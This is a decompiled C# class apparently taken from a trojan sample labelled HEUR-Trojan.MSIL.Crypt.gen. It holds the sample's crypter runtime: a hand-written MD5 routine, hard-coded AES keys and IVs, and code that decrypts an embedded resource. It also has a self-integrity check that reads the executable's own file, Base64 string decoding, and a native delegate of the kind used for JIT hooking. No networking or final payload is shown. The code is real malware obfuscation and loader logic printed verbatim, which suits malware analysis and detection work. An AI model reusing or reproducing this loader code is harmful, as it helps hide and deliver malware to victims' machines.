// Decompiled with JetBrains decompiler
// Type: Tourield.Attributes.ValueWrapperAttribute
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Tourield.Attributes
{
  internal class ValueWrapperAttribute
  {
    private static bool m_MappingWrapper = false;
    private static Assembly composerWrapper = typeof (ValueWrapperAttribute).Assembly;
    private static uint[] requestWrapper = new uint[64]
    {
      3614090360U,
      3905402710U,
      606105819U,
      3250441966U,
      4118548399U,
      1200080426U,
      2821735955U,
      4249261313U,
      1770035416U,
      2336552879U,
      4294925233U,
      2304563134U,
      1804603682U,
      4254626195U,
      2792965006U,
      1236535329U,
      4129170786U,
      3225465664U,
      643717713U,
      3921069994U,
      3593408605U,
      38016083U,
      3634488961U,
      3889429448U,
      568446438U,
      3275163606U,
      4107603335U,
      1163531501U,
      2850285829U,
      4243563512U,
      1735328473U,
      2368359562U,
      4294588738U,
      2272392833U,
      1839030562U,
      4259657740U,
      2763975236U,
      1272893353U,
      4139469664U,
      3200236656U,
      681279174U,
      3936430074U,
      3572445317U,
      76029189U,
      3654602809U,
      3873151461U,
      530742520U,
      3299628645U,
      4096336452U,
      1126891415U,
      2878612391U,
      4237533241U,
      1700485571U,
      2399980690U,
      4293915773U,
      2240044497U,
      1873313359U,
      4264355552U,
      2734768916U,
      1309151649U,
      4149444226U,
      3174756917U,
      718787259U,
      3951481745U
    };
    private static bool paramWrapper = false;
    private static bool _ProducerWrapper = false;
    private static byte[] printerWrapper = new byte[0];
    private static byte[] _ConsumerWrapper = new byte[0];
    private static byte[] publisherWrapper = new byte[0];
    private static byte[] policyWrapper = new byte[0];
    private static IntPtr _CallbackWrapper = IntPtr.Zero;
    private static IntPtr m_EventWrapper = IntPtr.Zero;
    private static object infoWrapper = (object) new string[0];
    private static int[] valWrapper = new int[0];
    private static int m_SystemWrapper = 1;
    private static bool tokenizerWrapper = false;
    private static SortedList modelWrapper = new SortedList();
    private static int _MerchantWrapper = 0;
    private static long attrWrapper = 0;
    internal static ValueWrapperAttribute.AdvisorPagePage globalWrapper = (ValueWrapperAttribute.AdvisorPagePage) null;
    internal static ValueWrapperAttribute.AdvisorPagePage algoWrapper = (ValueWrapperAttribute.AdvisorPagePage) null;
    private static long _ImporterWrapper = 0;
    private static int _CollectionWrapper = 0;
    private static bool reponseWrapper = false;
    private static bool m_InvocationWrapper = false;
    private static int containerWrapper = 0;
    private static IntPtr m_VisitorWrapper = IntPtr.Zero;
    [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
    private static bool contextWrapper = false;
    internal static Hashtable m_BaseWrapper = new Hashtable();

    [MethodImpl(MethodImplOptions.NoInlining)]
    static ValueWrapperAttribute()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ViewMethod()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static byte[] RunPrototype(byte[] param)
    {
      uint[] numArray1 = new uint[16];
      uint num1 = (uint) ((448 - param.Length * 8 % 512 + 512) % 512);
      if (num1 == 0U)
        num1 = 512U;
      uint length = (uint) ((ulong) param.Length + (ulong) (num1 / 8U) + 8UL);
      ulong num2 = (ulong) param.Length * 8UL;
      byte[] numArray2 = new byte[(IntPtr) length];
      for (int index = 0; index < param.Length; ++index)
        numArray2[index] = param[index];
      numArray2[param.Length] |= (byte) 128;
      for (int index = 8; index > 0; --index)
        numArray2[(long) length - (long) index] = (byte) (num2 >> (8 - index) * 8 & (ulong) byte.MaxValue);
      uint num3 = (uint) (numArray2.Length * 8) / 32U;
      uint num4 = 1732584193;
      uint num5 = 4023233417;
      uint num6 = 2562383102;
      uint num7 = 271733878;
      for (uint index1 = 0; index1 < num3 / 16U; ++index1)
      {
        uint num8 = index1 << 6;
        for (uint index2 = 0; index2 < 61U; index2 += 4U)
          numArray1[(IntPtr) (index2 >> 2)] = (uint) ((int) numArray2[(IntPtr) (num8 + (index2 + 3U))] << 24 | (int) numArray2[(IntPtr) (num8 + (index2 + 2U))] << 16 | (int) numArray2[(IntPtr) (num8 + (index2 + 1U))] << 8) | (uint) numArray2[(IntPtr) (num8 + index2)];
        uint num9 = num4;
        uint num10 = num5;
        uint num11 = num6;
        uint num12 = num7;
        ValueWrapperAttribute.DisablePrototype(ref num4, num5, num6, num7, 0U, (ushort) 7, 1U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num7, num4, num5, num6, 1U, (ushort) 12, 2U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num6, num7, num4, num5, 2U, (ushort) 17, 3U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num5, num6, num7, num4, 3U, (ushort) 22, 4U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num4, num5, num6, num7, 4U, (ushort) 7, 5U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num7, num4, num5, num6, 5U, (ushort) 12, 6U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num6, num7, num4, num5, 6U, (ushort) 17, 7U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num5, num6, num7, num4, 7U, (ushort) 22, 8U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num4, num5, num6, num7, 8U, (ushort) 7, 9U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num7, num4, num5, num6, 9U, (ushort) 12, 10U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num6, num7, num4, num5, 10U, (ushort) 17, 11U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num5, num6, num7, num4, 11U, (ushort) 22, 12U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num4, num5, num6, num7, 12U, (ushort) 7, 13U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num7, num4, num5, num6, 13U, (ushort) 12, 14U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num6, num7, num4, num5, 14U, (ushort) 17, 15U, numArray1);
        ValueWrapperAttribute.DisablePrototype(ref num5, num6, num7, num4, 15U, (ushort) 22, 16U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num4, num5, num6, num7, 1U, (ushort) 5, 17U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num7, num4, num5, num6, 6U, (ushort) 9, 18U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num6, num7, num4, num5, 11U, (ushort) 14, 19U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num5, num6, num7, num4, 0U, (ushort) 20, 20U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num4, num5, num6, num7, 5U, (ushort) 5, 21U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num7, num4, num5, num6, 10U, (ushort) 9, 22U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num6, num7, num4, num5, 15U, (ushort) 14, 23U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num5, num6, num7, num4, 4U, (ushort) 20, 24U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num4, num5, num6, num7, 9U, (ushort) 5, 25U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num7, num4, num5, num6, 14U, (ushort) 9, 26U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num6, num7, num4, num5, 3U, (ushort) 14, 27U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num5, num6, num7, num4, 8U, (ushort) 20, 28U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num4, num5, num6, num7, 13U, (ushort) 5, 29U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num7, num4, num5, num6, 2U, (ushort) 9, 30U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num6, num7, num4, num5, 7U, (ushort) 14, 31U, numArray1);
        ValueWrapperAttribute.ListPrototype(ref num5, num6, num7, num4, 12U, (ushort) 20, 32U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num4, num5, num6, num7, 5U, (ushort) 4, 33U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num7, num4, num5, num6, 8U, (ushort) 11, 34U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num6, num7, num4, num5, 11U, (ushort) 16, 35U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num5, num6, num7, num4, 14U, (ushort) 23, 36U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num4, num5, num6, num7, 1U, (ushort) 4, 37U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num7, num4, num5, num6, 4U, (ushort) 11, 38U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num6, num7, num4, num5, 7U, (ushort) 16, 39U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num5, num6, num7, num4, 10U, (ushort) 23, 40U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num4, num5, num6, num7, 13U, (ushort) 4, 41U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num7, num4, num5, num6, 0U, (ushort) 11, 42U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num6, num7, num4, num5, 3U, (ushort) 16, 43U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num5, num6, num7, num4, 6U, (ushort) 23, 44U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num4, num5, num6, num7, 9U, (ushort) 4, 45U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num7, num4, num5, num6, 12U, (ushort) 11, 46U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num6, num7, num4, num5, 15U, (ushort) 16, 47U, numArray1);
        ValueWrapperAttribute.InterruptPrototype(ref num5, num6, num7, num4, 2U, (ushort) 23, 48U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num4, num5, num6, num7, 0U, (ushort) 6, 49U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num7, num4, num5, num6, 7U, (ushort) 10, 50U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num6, num7, num4, num5, 14U, (ushort) 15, 51U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num5, num6, num7, num4, 5U, (ushort) 21, 52U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num4, num5, num6, num7, 12U, (ushort) 6, 53U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num7, num4, num5, num6, 3U, (ushort) 10, 54U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num6, num7, num4, num5, 10U, (ushort) 15, 55U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num5, num6, num7, num4, 1U, (ushort) 21, 56U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num4, num5, num6, num7, 8U, (ushort) 6, 57U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num7, num4, num5, num6, 15U, (ushort) 10, 58U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num6, num7, num4, num5, 6U, (ushort) 15, 59U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num5, num6, num7, num4, 13U, (ushort) 21, 60U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num4, num5, num6, num7, 4U, (ushort) 6, 61U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num7, num4, num5, num6, 11U, (ushort) 10, 62U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num6, num7, num4, num5, 2U, (ushort) 15, 63U, numArray1);
        ValueWrapperAttribute.InvokePrototype(ref num5, num6, num7, num4, 9U, (ushort) 21, 64U, numArray1);
        num4 += num9;
        num5 += num10;
        num6 += num11;
        num7 += num12;
      }
      byte[] destinationArray = new byte[16];
      Array.Copy((Array) BitConverter.GetBytes(num4), 0, (Array) destinationArray, 0, 4);
      Array.Copy((Array) BitConverter.GetBytes(num5), 0, (Array) destinationArray, 4, 4);
      Array.Copy((Array) BitConverter.GetBytes(num6), 0, (Array) destinationArray, 8, 4);
      Array.Copy((Array) BitConverter.GetBytes(num7), 0, (Array) destinationArray, 12, 4);
      return destinationArray;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void DisablePrototype(
      ref uint init,
      uint num_b,
      uint num_proc,
      uint token2_X,
      uint pred3offset,
      ushort idxcust4,
      uint cont5_Low,
      uint[] reference6)
    {
      init = num_b + ValueWrapperAttribute.InitPrototype(init + (uint) ((int) num_b & (int) num_proc | ~(int) num_b & (int) token2_X) + reference6[(IntPtr) pred3offset] + ValueWrapperAttribute.requestWrapper[(IntPtr) (cont5_Low - 1U)], idxcust4);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void ListPrototype(
      ref uint instance,
      uint previous_token,
      uint state,
      uint sum_item2,
      uint length_def3,
      ushort counter4_start,
      uint info5length,
      uint[] result6)
    {
      instance = previous_token + ValueWrapperAttribute.InitPrototype(instance + (uint) ((int) previous_token & (int) sum_item2 | (int) state & ~(int) sum_item2) + result6[(IntPtr) length_def3] + ValueWrapperAttribute.requestWrapper[(IntPtr) (info5length - 1U)], counter4_start);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void InterruptPrototype(
      ref uint param,
      uint b_low,
      uint num_rule,
      uint visitor2_Position,
      uint ID_reg3,
      ushort indexOf_result4,
      uint column_reg5,
      uint[] res6)
    {
      param = b_low + ValueWrapperAttribute.InitPrototype(param + (b_low ^ num_rule ^ visitor2_Position) + res6[(IntPtr) ID_reg3] + ValueWrapperAttribute.requestWrapper[(IntPtr) (column_reg5 - 1U)], indexOf_result4);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void InvokePrototype(
      ref uint info,
      uint second,
      uint previouscomp,
      uint previousvar12,
      uint reference3_high,
      ushort vis4_Position,
      uint task5,
      uint[] def6)
    {
      info = second + ValueWrapperAttribute.InitPrototype(info + (previouscomp ^ (second | ~previousvar12)) + def6[(IntPtr) reference3_high] + ValueWrapperAttribute.requestWrapper[(IntPtr) (task5 - 1U)], vis4_Position);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint InitPrototype(uint insert_DEFAt, ushort visitorcounter) => insert_DEFAt >> 32 - (int) visitorcounter | insert_DEFAt << (int) visitorcounter;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool ComparePrototype()
    {
      if (!ValueWrapperAttribute.paramWrapper)
      {
        ValueWrapperAttribute.IncludePrototype();
        ValueWrapperAttribute.paramWrapper = true;
      }
      return ValueWrapperAttribute._ProducerWrapper;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static SymmetricAlgorithm PrintPrototype()
    {
      if (ValueWrapperAttribute.ComparePrototype())
        return (SymmetricAlgorithm) new AesCryptoServiceProvider();
      try
      {
        return (SymmetricAlgorithm) new RijndaelManaged();
      }
      catch
      {
        return (SymmetricAlgorithm) Activator.CreateInstance("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "System.Security.Cryptography.AesCryptoServiceProvider").Unwrap();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void IncludePrototype()
    {
      try
      {
        ValueWrapperAttribute._ProducerWrapper = CryptoConfig.AllowOnlyFipsAlgorithms;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static byte[] ClonePrototype(byte[] item) => !ValueWrapperAttribute.ComparePrototype() ? new MD5CryptoServiceProvider().ComputeHash(item) : ValueWrapperAttribute.RunPrototype(item);

    [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool CollectPrototype(int start_setup)
    {
      if (ValueWrapperAttribute._ConsumerWrapper.Length == 0)
      {
        BinaryReader binaryReader = new BinaryReader(ValueWrapperAttribute.composerWrapper.GetManifestResourceStream("{11111-22222-20001-00000}"));
        binaryReader.BaseStream.Position = 0L;
        RSACryptoServiceProvider.UseMachineKeyStore = true;
        byte[] buffer = binaryReader.ReadBytes((int) binaryReader.BaseStream.Length);
        byte[] rgbKey = new ValueWrapperAttribute().RemovePrototype();
        byte[] rgbIV = new ValueWrapperAttribute().InstantiatePrototype();
        byte[] publicKeyToken = ValueWrapperAttribute.composerWrapper.GetName().GetPublicKeyToken();
        if (publicKeyToken != null && publicKeyToken.Length > 0)
        {
          rgbIV[1] = publicKeyToken[0];
          rgbIV[3] = publicKeyToken[1];
          rgbIV[5] = publicKeyToken[2];
          rgbIV[7] = publicKeyToken[3];
          rgbIV[9] = publicKeyToken[4];
          rgbIV[11] = publicKeyToken[5];
          rgbIV[13] = publicKeyToken[6];
          rgbIV[15] = publicKeyToken[7];
        }
        SymmetricAlgorithm symmetricAlgorithm = ValueWrapperAttribute.PrintPrototype();
        symmetricAlgorithm.Mode = CipherMode.CBC;
        ICryptoTransform decryptor = symmetricAlgorithm.CreateDecryptor(rgbKey, rgbIV);
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Write);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.FlushFinalBlock();
        ValueWrapperAttribute._ConsumerWrapper = memoryStream.ToArray();
        memoryStream.Close();
        cryptoStream.Close();
        binaryReader.Close();
      }
      if (ValueWrapperAttribute.printerWrapper.Length == 0)
        ValueWrapperAttribute.printerWrapper = ValueWrapperAttribute.ComputePrototype(ValueWrapperAttribute.TestPrototype((object) ValueWrapperAttribute.composerWrapper).ToString());
      int index = 0;
      try
      {
        index = BitConverter.ToInt32(new byte[4]
        {
          ValueWrapperAttribute._ConsumerWrapper[start_setup],
          ValueWrapperAttribute._ConsumerWrapper[start_setup + 1],
          ValueWrapperAttribute._ConsumerWrapper[start_setup + 2],
          ValueWrapperAttribute._ConsumerWrapper[start_setup + 3]
        }, 0);
      }
      catch
      {
      }
      try
      {
        if (ValueWrapperAttribute.printerWrapper[index] == (byte) 128)
          return true;
      }
      catch
      {
      }
      return false;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint DeletePrototype(uint indexOf_init) => (uint) "{11111-22222-10009-11111}".Length;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static uint AssetPrototype(uint key_High) => (uint) "{11111-22222-10009-11112}".Length;

    [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string CheckPrototype(string info)
    {
      "{11111-22222-50001-00000}".Trim();
      byte[] bytes = Convert.FromBase64String(info);
      return Encoding.Unicode.GetString(bytes, 0, bytes.Length);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static int PreparePrototype() => 5;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void AddPrototype()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static Delegate VerifyPrototype(IntPtr res, Type result) => (Delegate) typeof (Marshal).GetMethod("GetDelegateForFunctionPointer", new Type[2]
    {
      typeof (IntPtr),
      typeof (Type)
    }).Invoke((object) null, new object[2]
    {
      (object) res,
      (object) result
    });

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object TestPrototype(object reference)
    {
      try
      {
        if (File.Exists(((Assembly) reference).Location))
          return (object) ((Assembly) reference).Location;
      }
      catch
      {
      }
      try
      {
        if (File.Exists(((Assembly) reference).GetName().CodeBase.ToString().Replace("file:///", "")))
          return (object) ((Assembly) reference).GetName().CodeBase.ToString().Replace("file:///", "");
      }
      catch
      {
      }
      try
      {
        if (File.Exists(reference.GetType().GetProperty("Location").GetValue(reference, new object[0]).ToString()))
          return (object) reference.GetType().GetProperty("Location").GetValue(reference, new object[0]).ToString();
      }
      catch
      {
      }
      return (object) "";
    }

    [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] ComputePrototype(string var1)
    {
      byte[] buffer;
      using (FileStream fileStream = new FileStream(var1, FileMode.Open, FileAccess.Read, FileShare.Read))
      {
        int offset = 0;
        int length = (int) fileStream.Length;
        buffer = new byte[length];
        int num;
        for (; length > 0; length -= num)
        {
          num = fileStream.Read(buffer, offset, length);
          offset += num;
        }
      }
      return buffer;
    }

    [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] SelectPrototype(byte[] config)
    {
      MemoryStream memoryStream = new MemoryStream();
      SymmetricAlgorithm symmetricAlgorithm = ValueWrapperAttribute.PrintPrototype();
      symmetricAlgorithm.Key = new byte[32]
      {
        (byte) 123,
        (byte) 5,
        (byte) 74,
        (byte) 12,
        (byte) 244,
        (byte) 156,
        (byte) 221,
        (byte) 154,
        (byte) 121,
        (byte) 221,
        (byte) 183,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 9,
        (byte) 43,
        (byte) 67,
        (byte) 81,
        (byte) 23,
        (byte) 43,
        (byte) 74,
        (byte) 63,
        (byte) 64,
        (byte) 23,
        (byte) 95,
        (byte) 185,
        (byte) 226,
        (byte) 244,
        (byte) 45,
        (byte) 194,
        (byte) 211,
        (byte) 43
      };
      symmetricAlgorithm.IV = new byte[16]
      {
        (byte) 117,
        (byte) 254,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 52,
        (byte) 9,
        (byte) 43,
        (byte) 221,
        (byte) 154,
        (byte) 12,
        (byte) 54,
        (byte) 68,
        (byte) 241,
        (byte) 68,
        (byte) 66
      };
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(config, 0, config.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] StopPrototype() => "{11111-22222-10001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] DefinePrototype() => "{11111-22222-10001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] InstantiatePrototype() => "{11111-22222-20001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] RemovePrototype() => "{11111-22222-20001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] RegisterPrototype() => "{11111-22222-30001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] LoginPrototype() => "{11111-22222-30001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] LogoutPrototype() => "{11111-22222-40001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] NewPrototype() => "{11111-22222-40001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] SortPrototype() => "{11111-22222-50001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] PopPrototype() => "{11111-22222-50001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ValueWrapperAttribute()
    {
    }

    internal class InfoIssuerConnector : Attribute
    {
      [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      public InfoIssuerConnector(object ident)
      {
        RegistryPagePage.ListMethod();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal class ContextDatabaseVisitor<T>
      {
        [MethodImpl(MethodImplOptions.NoInlining)]
        public ContextDatabaseVisitor()
        {
          RegistryPagePage.ListMethod();
          // ISSUE: explicit constructor call
          base.\u002Ector();
        }

        internal static bool ConnectMethod() => true;

        internal static bool CustomizeMethod() => false;
      }
    }

    internal class HelperWrapper
    {
      [ValueWrapperAttribute.InfoIssuerConnector(typeof (ValueWrapperAttribute.InfoIssuerConnector.ContextDatabaseVisitor<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static string DestroyPrototype(string init, string connection)
      {
        byte[] bytes = Encoding.Unicode.GetBytes(init);
        byte[] numArray1 = new byte[32]
        {
          (byte) 82,
          (byte) 102,
          (byte) 104,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 118,
          (byte) 181,
          (byte) 51,
          (byte) 17,
          (byte) 18,
          (byte) 51,
          (byte) 12,
          (byte) 109,
          (byte) 10,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 158,
          (byte) 161,
          (byte) 41,
          (byte) 97,
          (byte) 28,
          (byte) 118,
          (byte) 181,
          (byte) 5,
          (byte) 25,
          (byte) 1,
          (byte) 88
        };
        byte[] numArray2 = ValueWrapperAttribute.ClonePrototype(Encoding.Unicode.GetBytes(connection));
        MemoryStream memoryStream = new MemoryStream();
        SymmetricAlgorithm symmetricAlgorithm = ValueWrapperAttribute.PrintPrototype();
        symmetricAlgorithm.Key = numArray1;
        symmetricAlgorithm.IV = numArray2;
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write);
        cryptoStream.Write(bytes, 0, bytes.Length);
        cryptoStream.Close();
        return Convert.ToBase64String(memoryStream.ToArray());
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public HelperWrapper()
      {
        RegistryPagePage.ListMethod();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate uint AdvisorPagePage(
      IntPtr classthis,
      IntPtr comp,
      IntPtr info,
      [MarshalAs(UnmanagedType.U4)] uint flags,
      IntPtr nativeEntry,
      ref uint nativeSizeOfCode);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr MessageFactoryRole();

    internal struct FilterResolverStatus
    {
      internal bool _RoleWrapper;
      internal byte[] _FieldWrapper;
    }

    [Flags]
    private enum ObserverWrapper
    {
    }
  }
}
